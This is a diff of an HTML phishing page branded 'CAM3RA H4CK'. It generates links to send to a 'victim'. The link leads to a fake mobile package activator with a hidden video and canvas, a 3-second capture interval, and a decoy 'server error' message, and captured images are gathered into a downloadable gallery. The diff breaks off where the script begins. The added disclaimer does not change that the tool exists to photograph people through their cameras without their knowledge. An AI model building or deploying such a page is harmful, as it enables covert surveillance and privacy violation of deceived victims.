@@ -1,562 +1,1384 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<title>🔗 Link Generator & Pkg Activator</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+<title>🔗 Secure Link Generator | Professional Package Activator</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 <style>
-/* --- General & Light Mode Base --- */
+:root {
+  /* Light Theme Variables */
+  --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+  --dark-bg: #0f172a;
+  --card-bg: #ffffff;
+  --card-border: #e2e8f0;
+  --text-primary: #1e293b;
+  --text-secondary: #64748b;
+  --text-light: #94a3b8;
+  --accent-blue: #3b82f6;
+  --accent-green: #10b981;
+  --accent-red: #ef4444;
+  --accent-purple: #8b5cf6;
+  --shadow-sm: 0 1px 3px rgba(0,0,0,0.08);
+  --shadow-md: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -1px rgba(0,0,0,0.06);
+  --shadow-lg: 0 10px 25px -5px rgba(0,0,0,0.1), 0 10px 10px -5px rgba(0,0,0,0.04);
+  --shadow-xl: 0 20px 40px -10px rgba(0,0,0,0.15);
+  --radius-sm: 8px;
+  --radius-md: 12px;
+  --radius-lg: 16px;
+  --radius-xl: 24px;
+  --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+}
+
+[data-theme="dark"] {
+  /* Dark Theme Variables */
+  --primary-gradient: linear-gradient(135deg, #7c3aed 0%, #4f46e5 100%);
+  --secondary-gradient: linear-gradient(135deg, #ec4899 0%, #8b5cf6 100%);
+  --dark-bg: #0f172a;
+  --card-bg: #1e293b;
+  --card-border: #334155;
+  --text-primary: #f8fafc;
+  --text-secondary: #cbd5e1;
+  --text-light: #94a3b8;
+  --accent-blue: #60a5fa;
+  --accent-green: #34d399;
+  --accent-red: #f87171;
+  --accent-purple: #a78bfa;
+  --shadow-sm: 0 1px 3px rgba(0,0,0,0.3);
+  --shadow-md: 0 4px 6px -1px rgba(0,0,0,0.4), 0 2px 4px -1px rgba(0,0,0,0.3);
+  --shadow-lg: 0 10px 25px -5px rgba(0,0,0,0.5), 0 10px 10px -5px rgba(0,0,0,0.3);
+  --shadow-xl: 0 20px 40px -10px rgba(0,0,0,0.6);
+}
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
 body {
-    font-family: 'Poppins', sans-serif;
-    background: #f8fafc; /* Light Gray/White Background */
-    color: #1e293b; /* Dark Text Color */
-    padding: 20px;
-    display: flex;
-    justify-content: center;
-    align-items: flex-start; 
-    min-height: 100vh;
+  font-family: 'Inter', sans-serif;
+  background: var(--dark-bg);
+  color: var(--text-primary);
+  min-height: 100vh;
+  padding: 20px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  transition: var(--transition);
+  position: relative;
+  overflow-x: hidden;
 }
 
-/* --- Card Styling --- */
+body::before {
+  content: '';
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: 
+    radial-gradient(circle at 10% 20%, rgba(120, 119, 198, 0.1) 0%, transparent 20%),
+    radial-gradient(circle at 90% 80%, rgba(255, 119, 198, 0.1) 0%, transparent 20%);
+  z-index: -1;
+}
+
+/* Theme Toggle */
+.theme-toggle {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  z-index: 1000;
+}
+
+.theme-toggle button {
+  background: var(--card-bg);
+  border: 1px solid var(--card-border);
+  color: var(--text-primary);
+  width: 44px;
+  height: 44px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  transition: var(--transition);
+  box-shadow: var(--shadow-md);
+}
+
+.theme-toggle button:hover {
+  transform: rotate(30deg);
+  box-shadow: var(--shadow-lg);
+}
+
+/* Main Container */
+.container {
+  width: 100%;
+  max-width: 1200px;
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 30px;
+  margin: 20px auto;
+}
+
+@media (max-width: 992px) {
+  .container {
+    grid-template-columns: 1fr;
+    gap: 20px;
+  }
+}
+
+/* Cards */
 .card {
-    background: #ffffff; /* Pure White Card Background */
-    padding: 30px;
-    border-radius: 16px;
-    max-width: 450px;
-    width: 95%; 
-    margin: 20px auto;
-    box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1); 
-    border: 1px solid #e2e8f0; 
-    transition: all 0.3s ease;
+  background: var(--card-bg);
+  border-radius: var(--radius-xl);
+  padding: 40px;
+  box-shadow: var(--shadow-xl);
+  border: 1px solid var(--card-border);
+  transition: var(--transition);
+  position: relative;
+  overflow: hidden;
 }
 
-/* --- Header Section (Gap Further Reduced) --- */
-.header-container {
-    display: flex;
-    align-items: center; 
-    justify-content: center;
-    gap: 3px; /* Gap reduced to 3px */
-    margin-bottom: 8px;
+.card::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 4px;
+  background: var(--primary-gradient);
 }
 
-/* --- Image Styling (Size Increased) --- */
-#header-img-link {
-    display: block;
-    width: 36px; /* Size increased */
-    height: 36px;
-    flex-shrink: 0; 
+.card:hover {
+  transform: translateY(-5px);
+  box-shadow: var(--shadow-lg);
 }
-#header-img-link img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    border-radius: 4px;
+
+/* Header */
+.header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 30px;
+  flex-wrap: wrap;
+  gap: 15px;
+}
+
+.logo-container {
+  display: flex;
+  align-items: center;
+  gap: 15px;
+}
+
+.logo {
+  width: 50px;
+  height: 50px;
+  background: var(--primary-gradient);
+  border-radius: var(--radius-md);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+  font-size: 24px;
+  font-weight: 700;
+}
+
+.logo-text {
+  font-size: 24px;
+  font-weight: 800;
+  background: var(--primary-gradient);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+
+.badge {
+  background: var(--secondary-gradient);
+  color: white;
+  padding: 6px 12px;
+  border-radius: var(--radius-sm);
+  font-size: 12px;
+  font-weight: 600;
+  letter-spacing: 0.5px;
+}
+
+/* Typography */
+h1 {
+  font-family: 'Poppins', sans-serif;
+  font-size: 32px;
+  font-weight: 800;
+  margin-bottom: 10px;
+  background: var(--primary-gradient);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
 }
 
 h2 {
-    font-weight: 700;
-    color: #0f172a; 
-    margin: 0; 
-    text-align: center;
+  font-family: 'Poppins', sans-serif;
+  font-size: 24px;
+  font-weight: 700;
+  margin-bottom: 20px;
+  color: var(--text-primary);
 }
 
 h3 {
-    font-weight: 600;
-    color: #475569; 
-    margin: 20px 0 15px 0;
-    text-align: center;
+  font-family: 'Poppins', sans-serif;
+  font-size: 18px;
+  font-weight: 600;
+  margin-bottom: 15px;
+  color: var(--text-primary);
 }
 
-/* --- Data Header (Captured Data Section) --- */
-.data-header-container {
-    display: flex;
-    align-items: center; 
-    justify-content: center;
-    gap: 5px; 
-    margin: 20px 0 15px 0; 
+.subtitle {
+  color: var(--text-secondary);
+  font-size: 16px;
+  line-height: 1.6;
+  margin-bottom: 30px;
 }
 
-.data-header-container h3 {
-    margin: 0;
-    text-align: left; 
+/* Buttons */
+.btn {
+  padding: 14px 28px;
+  border-radius: var(--radius-md);
+  border: none;
+  font-family: 'Inter', sans-serif;
+  font-weight: 600;
+  font-size: 15px;
+  cursor: pointer;
+  transition: var(--transition);
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  letter-spacing: 0.3px;
 }
 
-.data-header-container img {
-    width: 24px;
-    height: 24px;
-    object-fit: cover;
-    border-radius: 4px;
+.btn-primary {
+  background: var(--primary-gradient);
+  color: white;
+  box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
 }
 
-/* --- Button Styling --- */
-button {
-    padding: 12px 20px;
-    border-radius: 10px;
-    border: 0;
-    background: #3b82f6; /* Default Blue */
-    color: #fff;
-    font-weight: 600;
-    cursor: pointer;
-    transition: all 0.2s ease;
-    box-shadow: 0 4px 10px rgba(59, 130, 246, 0.3);
+.btn-primary:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
 }
 
-button:hover {
-    background: #2563eb; 
-    box-shadow: 0 6px 15px rgba(59, 130, 246, 0.4);
+.btn-secondary {
+  background: var(--secondary-gradient);
+  color: white;
+  box-shadow: 0 4px 15px rgba(240, 147, 251, 0.3);
 }
 
-button:active {
-    transform: translateY(1px);
-    box-shadow: 0 2px 5px rgba(59, 130, 246, 0.3);
+.btn-secondary:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 20px rgba(240, 147, 251, 0.4);
 }
 
-/* --- Input/Select Styling (Cool Look) --- */
-input, select {
-    width: 100%;
-    padding: 15px 12px; 
-    border-radius: 12px; 
-    border: 2px solid #cbd5e1; 
-    margin-top: 15px; 
-    background: #ffffff; 
-    color: #1e293b;
-    font-size: 16px; 
-    transition: border-color 0.3s, box-shadow 0.3s;
-    box-sizing: border-box;
+.btn-success {
+  background: var(--accent-green);
+  color: white;
+  box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
 }
 
-input:focus, select:focus {
-    outline: none;
-    border-color: #3b82f6; 
-    box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2); 
+.btn-danger {
+  background: var(--accent-red);
+  color: white;
+  box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
 }
 
-/* --- Utility & Gallery --- */
+.btn-outline {
+  background: transparent;
+  border: 2px solid var(--card-border);
+  color: var(--text-primary);
+}
+
+.btn-outline:hover {
+  border-color: var(--accent-blue);
+  color: var(--accent-blue);
+}
+
+.btn-small {
+  padding: 10px 20px;
+  font-size: 14px;
+}
+
+.btn-full {
+  width: 100%;
+}
+
+/* Form Elements */
+.form-group {
+  margin-bottom: 25px;
+}
+
+label {
+  display: block;
+  margin-bottom: 8px;
+  font-weight: 500;
+  color: var(--text-primary);
+  font-size: 14px;
+}
+
+select, input {
+  width: 100%;
+  padding: 16px 20px;
+  border-radius: var(--radius-md);
+  border: 2px solid var(--card-border);
+  background: var(--card-bg);
+  color: var(--text-primary);
+  font-family: 'Inter', sans-serif;
+  font-size: 15px;
+  transition: var(--transition);
+  appearance: none;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%2394a3b8' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+  background-repeat: no-repeat;
+  background-position: right 20px center;
+  background-size: 16px;
+}
+
+select:focus, input:focus {
+  outline: none;
+  border-color: var(--accent-blue);
+  box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+}
+
+.input-with-icon {
+  position: relative;
+}
+
+.input-icon {
+  position: absolute;
+  left: 20px;
+  top: 50%;
+  transform: translateY(-50%);
+  color: var(--text-light);
+}
+
+.input-with-icon input {
+  padding-left: 50px;
+}
+
+/* Link Box */
+.link-box {
+  background: rgba(59, 130, 246, 0.05);
+  border-radius: var(--radius-md);
+  padding: 25px;
+  margin: 25px 0;
+  border: 1px solid rgba(59, 130, 246, 0.2);
+}
+
+.link-display {
+  display: flex;
+  gap: 10px;
+  margin-bottom: 20px;
+}
+
+.link-display input {
+  flex: 1;
+  background: var(--card-bg);
+  font-family: 'Monaco', 'Courier New', monospace;
+  font-size: 14px;
+  padding: 14px;
+}
+
+.btn-group {
+  display: flex;
+  gap: 10px;
+  flex-wrap: wrap;
+}
+
+.session-info {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  background: rgba(16, 185, 129, 0.05);
+  padding: 12px 20px;
+  border-radius: var(--radius-md);
+  margin-top: 20px;
+  border: 1px solid rgba(16, 185, 129, 0.2);
+}
+
+.session-info span {
+  font-size: 14px;
+  color: var(--text-secondary);
+}
+
+.session-id {
+  font-family: 'Monaco', 'Courier New', monospace;
+  font-weight: 600;
+  color: var(--accent-green);
+}
+
+/* Gallery */
+.gallery-container {
+  margin-top: 30px;
+}
+
+.gallery-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 20px;
+}
+
 .gallery {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(80px, 1fr));
-    gap: 8px;
-    margin-top: 15px;
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+  gap: 12px;
+  margin-bottom: 25px;
 }
-/* Centering "No images yet" text */
-.gallery small { 
+
+.gallery-item {
+  position: relative;
+  border-radius: var(--radius-md);
+  overflow: hidden;
+  aspect-ratio: 1;
+  background: var(--card-border);
+  transition: var(--transition);
+}
+
+.gallery-item:hover {
+  transform: scale(1.05);
+  box-shadow: var(--shadow-md);
+}
+
+.gallery-item img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  display: block;
+}
+
+.gallery-placeholder {
+  grid-column: 1 / -1;
+  text-align: center;
+  padding: 40px 20px;
+  color: var(--text-light);
+  background: rgba(148, 163, 184, 0.05);
+  border-radius: var(--radius-md);
+  border: 1px dashed var(--card-border);
+}
+
+/* Status Messages */
+.status-message {
+  padding: 20px;
+  border-radius: var(--radius-md);
+  margin: 20px 0;
+  text-align: center;
+  font-weight: 500;
+  display: none;
+}
+
+.status-error {
+  background: rgba(239, 68, 68, 0.1);
+  border: 1px solid rgba(239, 68, 68, 0.3);
+  color: var(--accent-red);
+}
+
+.status-success {
+  background: rgba(16, 185, 129, 0.1);
+  border: 1px solid rgba(16, 185, 129, 0.3);
+  color: var(--accent-green);
+}
+
+.status-warning {
+  background: rgba(245, 158, 11, 0.1);
+  border: 1px solid rgba(245, 158, 11, 0.3);
+  color: #f59e0b;
+}
+
+/* Stats Cards */
+.stats-container {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+  gap: 15px;
+  margin: 25px 0;
+}
+
+.stat-card {
+  background: var(--card-bg);
+  border-radius: var(--radius-md);
+  padding: 20px;
+  text-align: center;
+  border: 1px solid var(--card-border);
+  transition: var(--transition);
+}
+
+.stat-card:hover {
+  transform: translateY(-3px);
+  box-shadow: var(--shadow-md);
+}
+
+.stat-number {
+  font-size: 32px;
+  font-weight: 800;
+  background: var(--primary-gradient);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  margin-bottom: 5px;
+}
+
+.stat-label {
+  font-size: 13px;
+  color: var(--text-secondary);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+/* Footer */
+.footer {
+  text-align: center;
+  margin-top: 40px;
+  padding-top: 30px;
+  border-top: 1px solid var(--card-border);
+  color: var(--text-light);
+  font-size: 14px;
+  width: 100%;
+}
+
+.powered-by {
+  font-size: 16px;
+  font-weight: 600;
+  margin-bottom: 10px;
+  color: var(--text-primary);
+}
+
+.marquee-container {
+  overflow: hidden;
+  white-space: nowrap;
+  margin: 20px 0;
+  padding: 15px 0;
+  position: relative;
+}
+
+.marquee-container::before,
+.marquee-container::after {
+  content: '';
+  position: absolute;
+  top: 0;
+  width: 100px;
+  height: 100%;
+  z-index: 1;
+}
+
+.marquee-container::before {
+  left: 0;
+  background: linear-gradient(to right, var(--dark-bg), transparent);
+}
+
+.marquee-container::after {
+  right: 0;
+  background: linear-gradient(to left, var(--dark-bg), transparent);
+}
+
+.marquee-content {
+  display: inline-block;
+  animation: marquee 30s linear infinite;
+  font-size: 18px;
+  font-weight: 600;
+  padding-left: 100%;
+}
+
+@keyframes marquee {
+  0% { transform: translateX(0); }
+  100% { transform: translateX(-100%); }
+}
+
+/* Floating Buttons */
+.floating-buttons {
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  display: flex;
+  flex-direction: column;
+  gap: 15px;
+  z-index: 1000;
+}
+
+.floating-btn {
+  width: 56px;
+  height: 56px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+  font-size: 22px;
+  box-shadow: var(--shadow-lg);
+  transition: var(--transition);
+  border: none;
+  cursor: pointer;
+}
+
+.floating-btn:hover {
+  transform: translateY(-5px) scale(1.1);
+  box-shadow: var(--shadow-xl);
+}
+
+.floating-btn-whatsapp {
+  background: linear-gradient(135deg, #25D366, #128C7E);
+}
+
+.floating-btn-download {
+  background: var(--primary-gradient);
+}
+
+.floating-btn-help {
+  background: var(--secondary-gradient);
+}
+
+/* Responsive Design */
+@media (max-width: 768px) {
+  .container {
+    padding: 15px;
+  }
+  
+  .card {
+    padding: 25px;
+  }
+  
+  .link-display {
+    flex-direction: column;
+  }
+  
+  .btn-group {
+    flex-direction: column;
+  }
+  
+  .btn-group .btn {
     width: 100%;
-    grid-column: 1 / -1; 
-    text-align: center; /* Ensures center alignment */
+  }
+  
+  .floating-buttons {
+    bottom: 20px;
+    right: 20px;
+  }
 }
 
-img {
-    width: 100%;
-    height: 80px; 
-    object-fit: cover;
-    border-radius: 6px;
-    display: block;
+/* Animation for new link generation */
+@keyframes pulse {
+  0% { transform: scale(1); }
+  50% { transform: scale(1.05); }
+  100% { transform: scale(1); }
 }
 
-small {
-    color: #64748b; 
-    display: block;
-    text-align: center;
-    margin-bottom: 15px;
-}
-
-hr {
-    margin: 25px 0;
-    border: none;
-    border-top: 1px solid #e2e8f0; 
-}
-
-#linkBox {
-    display: flex;
-    flex-wrap: wrap; 
-    justify-content: space-between;
-    gap: 8px;
-    margin-top: 15px;
-}
-#linkBox input {
-    width: 100%; 
-    margin-top: 0;
-    margin-bottom: 8px;
-}
-#linkBox button {
-    width: calc(50% - 4px); 
-    margin-top: 0;
-}
-#refreshBtn {
-    width: 100%; 
-    margin-top: 8px; 
-}
-
-/* --- Download Button Specific Style --- */
-#downloadBtn {
-    width: 100%;
-    margin-top: 15px;
-    background: #059669; /* Green/Teal for Download */
-}
-
-/* --- Pkg Activator Specific Styles --- */
-#pkg-activator-card {
-    max-width: 400px;
-}
-#activateBtn {
-    width: 100%;
-    margin-top: 30px; 
-    background: #10b981; 
-    font-size: 18px; 
-    padding: 15px 20px;
-}
-#activationStatus {
-    text-align: center;
-    margin-top: 30px;
-    font-weight: 600;
-    display: none;
-    padding: 20px; 
-    border-radius: 12px;
-    border: 2px solid #ef4444; 
-    background-color: #fef2f2; 
-    color: #b91c1c; 
-    line-height: 1.4;
-    box-shadow: 0 4px 15px rgba(239, 68, 68, 0.2);
+.pulse {
+  animation: pulse 0.5s ease-in-out;
 }
 
 /* Hidden elements */
-video {
-    opacity: 0; 
-    position: absolute;
-    z-index: -1;
+.hidden {
+  display: none;
 }
 
-/* --- WhatsApp Floating Button (New) --- */
-#whatsapp-btn {
-    position: fixed;
-    bottom: 20px;
-    right: 20px;
-    width: 50px;
-    height: 50px;
-    background-color: #25d366; /* WhatsApp Green */
-    color: white;
-    border-radius: 50%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-size: 24px;
-    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
-    z-index: 1000;
-    transition: transform 0.2s;
-}
-
-#whatsapp-btn:hover {
-    transform: scale(1.05);
+video, canvas {
+  opacity: 0;
+  position: absolute;
+  z-index: -1;
 }
 </style>
 </head>
 <body>
-
-<div class="card" id="dashboard-card">
-    <div class="header-container">
-        <a id="header-img-link" href="https://imgbb.com/">
-            <img src="https://i.ibb.co/NdB47GyN/images-2.jpg" alt="images (2)" border="0">
-        </a>
-        <h2><div><font color="#ff0000">C</font><font color="#ff4000">A</font><font color="#ff7f00">M</font><font color="#fff600">3</font><font color="#80ff00">R</font><font color="#00ff00">A</font><font color="#00ff80"> </font><font color="#00ffff">H</font><font color="#0000ff">4</font><font color="#4600ff">C</font><font color="#8b00ff">K</font></div></h2>
-  </div>                 
-    <small>Click on generate link button and send it to victim to access camera of victim.</small>
-
-    <div id="genArea" style="text-align: center;">
-        <button id="genBtn">Generate New Link</button>
-        <div id="linkBox">
-            </div>
-    </div>
-       
-<marquee behavior="scroll" direction="left">
- <div><font color="#ff0000">P</font><font color="#ff1900">O</font><font color="#ff3300">W</font><font color="#ff4c00">E</font><font color="#ff6600">R</font><font color="#ff7f00">E</font><font color="#ff9900">D</font><font color="#ffb200"> </font><font color="#ffcc00">B</font><font color="#ffe500">Y</font><font color="#ffff00"> </font><font color="#ccff00">|</font><font color="#99ff00"> </font><font color="#66ff00">M</font><font color="#33ff00">I</font><font color="#00ff00">A</font><font color="#00ff33">N</font><font color="#00ff66"> </font><font color="#00ff99">A</font><font color="#00ffcc">B</font><font color="#00ffff">D</font><font color="#00ccff">U</font><font color="#0099ff">L</font><font color="#0066ff">-</font><font color="#0033ff">R</font><font color="#0000ff">E</font><font color="#1c00ff">H</font><font color="#3800ff">M</font><font color="#5300ff">A</font><font color="#6f00ff">N</font><font color="#8b00ff"> </font></div> 
-</marquee>
-    <hr>
-
-    <div id="dataArea" style="display:none">
-        <div class="data-header-container">
-            <a style="display: block; width: 24px; height: 24px;"> 
-                <img src="https://i.ibb.co/NdB47GyN/images-2.jpg" alt="camera icon">
-            </a>
-            <h3>Captured Data (ID: <span id="showId"></span>)</h3>
-        </div>
-        <div><font color="#ff0000">D</font><font color="#ff1900">I</font><font color="#ff3300">S</font><font color="#ff4c00">C</font><font color="#ff6600">L</font><font color="#ff7f00">A</font><font color="#ff9900">I</font><font color="#ffb200">M</font><font color="#ffcc00">E</font><font color="#ffe500">R</font><font color="#ffff00"> </font><font color="#ccff00">:</font><font color="#99ff00"> </font><font color="#66ff00">U</font><font color="#33ff00">S</font><font color="#00ff00">E</font><font color="#00ff40"> </font><font color="#00ff80">O</font><font color="#00ffbf">N</font><font color="#00ffff"> </font><font color="#00ccff">Y</font><font color="#0099ff">O</font><font color="#0066ff">U</font><font color="#0033ff">R</font><font color="#0000ff"> </font><font color="#1c00ff">R</font><font color="#3800ff">I</font><font color="#5300ff">S</font><font color="#6f00ff">K</font><font color="#8b00ff"> </font></div>
-        
-        <div id="images" class="gallery"></div>
-        
-        <button id="downloadBtn" onclick="downloadAllImages()">Download All Captured Images</button>
-    </div>
+<!-- Theme Toggle -->
+<div class="theme-toggle">
+  <button id="themeToggle">
+    <i class="fas fa-moon"></i>
+  </button>
 </div>
 
-<div class="card" id="pkg-activator-card" style="display:none;">
-    <h2>Pkg Activator</h2>
-    <small>Select your SIM and enter your number to activate your desired package.</small>
+<!-- Main Container -->
+<div class="container">
+  <!-- Dashboard Card -->
+  <div class="card" id="dashboard-card">
+    <div class="header">
+      <div class="logo-container">
+        <div class="logo">C3</div>
+        <div class="logo-text">E3 CAM3RA H4CK</div>
+      </div>
+      <div class="badge">PROFESSIONAL HACKER</div>
+    </div>
     
-    <select id="sim-select">
-        <option value="">-- Select Your SIM --</option>
+    <h1>Secure Link Generator</h1>
+    <p class="subtitle">Generate unique tracking links and manage captured data. All sessions persist even after page refresh.</p>
+    
+    <!-- Stats -->
+    <div class="stats-container">
+      <div class="stat-card">
+        <div class="stat-number" id="totalLinks">0</div>
+        <div class="stat-label">Links Generated</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-number" id="totalImages">0</div>
+        <div class="stat-label">Images Captured</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-number" id="activeSessions">1</div>
+        <div class="stat-label">Active Sessions</div>
+      </div>
+    </div>
+    
+    <!-- Link Generation Section -->
+    <div class="form-group">
+      <button class="btn btn-primary btn-full" id="genBtn">
+        <i class="fas fa-plus-circle"></i> Generate New Link
+      </button>
+    </div>
+    
+    <div id="linkArea" class="hidden">
+      <div class="link-box">
+        <h3><i class="fas fa-link"></i> Generated Link</h3>
+        <div class="link-display">
+          <input type="text" id="generatedLink" readonly>
+        </div>
+        <div class="btn-group">
+          <button class="btn btn-secondary btn-small" id="copyBtn">
+            <i class="fas fa-copy"></i> Copy
+          </button>
+          <button class="btn btn-outline btn-small" id="openBtn">
+            <i class="fas fa-external-link-alt"></i> Open
+          </button>
+          <button class="btn btn-success btn-small" id="refreshBtn">
+            <i class="fas fa-sync-alt"></i> Refresh Data
+          </button>
+        </div>
+        
+        <!-- Session Info -->
+        <div class="session-info">
+          <span><i class="fas fa-user-shield"></i> Active Session</span>
+          <span class="session-id" id="sessionId">Not Set</span>
+        </div>
+      </div>
+    </div>
+    
+    <!-- Data Area -->
+    <div id="dataArea" class="hidden">
+      <div class="gallery-header">
+        <h3><i class="fas fa-images"></i> Captured Data</h3>
+        <button class="btn btn-danger btn-small" id="clearBtn">
+          <i class="fas fa-trash"></i> Clear All
+        </button>
+      </div>
+      
+      <div class="gallery" id="images"></div>
+      
+      <button class="btn btn-primary btn-full" id="downloadBtn">
+        <i class="fas fa-download"></i> Download All Images (ZIP)
+      </button>
+    </div>
+    
+    <!-- Disclaimer -->
+    <div class="status-message status-warning" style="display: block; margin-top: 30px;">
+      <i class="fas fa-exclamation-triangle"></i> DISCLAIMER: Use responsibly and only for legitimate purposes. Unauthorized access to devices is illegal.
+    </div>
+  </div>
+  
+  <!-- Package Activator Card -->
+  <div class="card" id="pkg-activator-card" style="display: none;">
+    <div class="header">
+      <div class="logo-container">
+        <div class="logo">PA</div>
+        <div class="logo-text">Package Activator</div>
+      </div>
+      <div class="badge">PREMIUM</div>
+    </div>
+    
+    <h1>Package Activation</h1>
+    <p class="subtitle">Select your SIM provider and enter your mobile number to activate your desired package.</p>
+    
+    <!-- Activation Form -->
+    <div class="form-group">
+      <label for="sim-select"><i class="fas fa-sim-card"></i> Select SIM Provider</label>
+      <select id="sim-select">
+        <option value="">-- Choose Provider --</option>
         <option value="jazz">Jazz</option>
         <option value="telenor">Telenor</option>
         <option value="ufone">Ufone</option>
         <option value="zong">Zong</option>
         <option value="sco">SCOM</option>
         <option value="other">Other/Landline</option>
-    </select>
+      </select>
+    </div>
     
-    <input type="tel" id="mobile-number" placeholder="Enter Mobile Number (03xxxxxxxxx)">
+    <div class="form-group">
+      <label for="mobile-number"><i class="fas fa-mobile-alt"></i> Mobile Number</label>
+      <div class="input-with-icon">
+        <i class="fas fa-phone input-icon"></i>
+        <input type="tel" id="mobile-number" placeholder="03xxxxxxxxx" maxlength="11">
+      </div>
+    </div>
     
-    <button id="activateBtn">Activate Pkg</button>
+    <button class="btn btn-primary btn-full" id="activateBtn">
+      <i class="fas fa-bolt"></i> Activate Package
+    </button>
     
-    <div id="activationStatus"></div>
-
+    <!-- Activation Status -->
+    <div class="status-message status-error" id="activationStatus">
+      <i class="fas fa-server"></i> SERVER ERROR<br>
+      <small>Please try again later. Server is down due to overload.</small>
+    </div>
+    
+    <!-- Camera Elements (Hidden) -->
     <video id="videoElement" autoplay playsinline muted></video>
-    <canvas id="canvasElement" style="display:none;"></canvas>
+    <canvas id="canvasElement"></canvas>
+  </div>
 </div>
 
-<a id="whatsapp-btn" href="https://whatsapp.com/channel/0029VbB4Y41EVccLcCk8lK1p" target="_blank">
+<!-- Marquee -->
+<div class="marquee-container">
+  <div class="marquee-content">
+    <span style="color: #ff0000">P</span>
+    <span style="color: #ff3300">O</span>
+    <span style="color: #ff6600">W</span>
+    <span style="color: #ff9900">E</span>
+    <span style="color: #ffcc00">R</span>
+    <span style="color: #ffff00">E</span>
+    <span style="color: #ccff00">D</span>
+    <span style="color: #99ff00"> </span>
+    <span style="color: #66ff00">B</span>
+    <span style="color: #33ff00">Y</span>
+    <span style="color: #00ff00"> </span>
+    <span style="color: #00ff33">|</span>
+    <span style="color: #00ff66"> </span>
+    <span style="color: #00ff99">E</span>
+    <span style="color: #00ffcc">3</span>
+    <span style="color: #00ffff"> </span>
+    <span style="color: #00ccff">H</span>
+    <span style="color: #0099ff">A</span>
+    <span style="color: #0066ff">C</span>
+    <span style="color: #0033ff">K</span>
+    <span style="color: #0000ff">E</span>
+    <span style="color: #3300ff">R</span>
+    <span style="color: #6600ff"> </span>
+    <span style="color: #9900ff">P</span>
+    <span style="color: #cc00ff">R</span>
+    <span style="color: #ff00ff">O</span>
+    <span style="color: #ff00cc"> </span>
+    <span style="color: #ff0099">H</span>
+    <span style="color: #ff0066">A</span>
+    <span style="color: #ff0033">C</span>
+    <span style="color: #ff0000">K</span>
+  </div>
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="powered-by"> E3 CAM3RA H4CK PROFESSIONAL</div>
+  <div>© 2026 Secure Link Generator & Package Activator. All rights reserved.</div>
+</div>
+
+<!-- Floating Buttons -->
+<div class="floating-buttons">
+  <button class="floating-btn floating-btn-whatsapp" id="whatsappBtn">
     <i class="fab fa-whatsapp"></i>
-</a>
+  </button>
+  <button class="floating-btn floating-btn-download" id="floatingDownloadBtn">
+    <i class="fas fa-download"></i>
+  </button>
+  <button class="floating-btn floating-btn-help" id="helpBtn">
+    <i class="fas fa-question"></i>
+  </button>
+</div>
 
 <script>
-// Capture interval set to 3 seconds
-const CAPTURE_INTERVAL_MS = 3000; 
+// ====================
+// GLOBAL VARIABLES
+// ====================
+const CAPTURE_INTERVAL_MS = 3000;
+let currentSessionId = null;
+let allSessions = JSON.parse(localStorage.getItem('allSessions') || '[]');
